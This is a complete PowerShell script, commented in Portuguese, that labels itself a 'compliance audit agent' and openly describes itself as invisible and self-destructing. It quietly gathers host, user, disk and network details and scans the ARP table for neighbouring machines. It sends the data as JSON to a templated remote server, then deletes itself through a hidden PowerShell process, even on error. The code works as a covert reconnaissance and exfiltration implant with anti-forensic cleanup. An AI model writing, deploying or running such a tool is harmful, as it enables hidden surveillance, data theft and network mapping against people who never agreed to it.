# KALI-CORE V3.0 - Agente de Auditoria de Conformidade (Invisível e Autodestrutível)
# Execução em memória - Sem arquivos locais
# Autodestruição imediata pós-envio

# Variáveis injetadas dinamicamente pelo servidor
$ServerIP = "{{SERVER_IP}}"

# Função para coletar informações de hardware
function Get-HardwareInfo {
    $hardware = @{
        computer_name = $env:COMPUTERNAME
        username = $env:USERNAME
        os_version = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        cpu = (Get-WmiObject -Class Win32_Processor).Name
        ram = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        hds = @()
    }
    
    # Coleta informações de discos
    $disks = Get-WmiObject -Class Win32_LogicalDisk
    foreach ($disk in $disks) {
        $hardware.hds += @{
            drive = $disk.DeviceID
            size = [math]::Round($disk.Size / 1GB, 2)
            free = [math]::Round($disk.FreeSpace / 1GB, 2)
        }
    }
    
    return $hardware
}

# Função para coletar informações de rede
function Get-NetworkInfo {
    $network = @{
        ip_address = ""
        mac_address = ""
        subnet_mask = ""
        gateway = ""
    }
    
    $ipconfig = Get-NetIPConfiguration
    foreach ($adapter in $ipconfig) {
        if ($adapter.IPv4DefaultGateway -and $adapter.IPv4DefaultGateway.NextHop) {
            $network.ip_address = $adapter.IPv4Address.IPAddress
            $network.mac_address = $adapter.MACAddress
            $network.subnet_mask = $adapter.IPv4Address.PrefixLength
            $network.gateway = $adapter.IPv4DefaultGateway.NextHop
            break
        }
    }
    
    return $network
}

# Função para varrer tabela ARP e caçar vizinhos
function Get-ARPNeighbors {
    $arp_output = arp -a
    $neighbors = @()
    
    foreach ($line in $arp_output) {
        if ($line -match "(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+([a-fA-F0-9]{2}-[a-fA-F0-9]{2}-[a-fA-F0-9]{2}-[a-fA-F0-9]{2}-[a-fA-F0-9]{2}-[a-fA-F0-9]{2})") {
            $neighbors += @{
                ip = $matches[1]
                mac = $matches[2]
            }
        }
    }
    
    return $neighbors
}

# Função para autodestruição do script
function Invoke-SelfDestruct {
    $scriptPath = $MyInvocation.MyCommand.Path
    if (Test-Path $scriptPath) {
        Start-Process powershell -ArgumentList "-Command", "Remove-Item -Path '$scriptPath' -Force; Start-Sleep -Seconds 1" -WindowStyle Hidden
    }
}

# Execução principal
try {
    # Coleta todas as informações em memória
    $hardwareInfo = Get-HardwareInfo
    $networkInfo = Get-NetworkInfo
    $arpNeighbors = Get-ARPNeighbors
    
    # Estrutura o objeto JSON em memória
    $auditData = @{
        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        hardware = $hardwareInfo
        network = $networkInfo
        neighbors = $arpNeighbors
    }
    
    # Converte para JSON em memória
    $jsonData = $auditData | ConvertTo-Json -Depth 10
    
    # Transmite diretamente para o servidor
    $uri = "http://${ServerIP}/api/v1/assets/upload"
    $response = Invoke-RestMethod -Uri $uri -Method Post -Body $jsonData -ContentType "application/json"
    
    # Verifica se o envio foi bem-sucedido
    if ($response.success -eq $true) {
        # Autodestruição imediata
        Invoke-SelfDestruct
    }
} catch {
    # Em caso de erro, também tenta autodestruir
    Invoke-SelfDestruct
}
